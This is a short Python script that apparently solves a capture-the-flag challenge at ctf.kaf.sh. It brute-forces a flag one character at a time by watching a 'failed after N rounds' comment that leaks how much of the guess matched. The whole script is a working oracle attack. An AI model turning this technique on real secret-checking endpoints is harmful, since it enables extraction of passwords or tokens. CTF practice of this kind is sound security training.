import requests
f='http://ctf.kaf.sh:1050/scripts/page/?KAF{120984210097130917230971203974284793'
t=41
while(True):
    for i in range(33,127):
        r=requests.get(f+chr(i))
        if('<!-- failed after '+str(t)+' rounds-->' in r.text):
            t=t+1
            f=f+chr(i)
            print('t: ',t)
            print(f)
            print(i)
            print('toAdd:',chr(i))
            print(r.status_code)
            break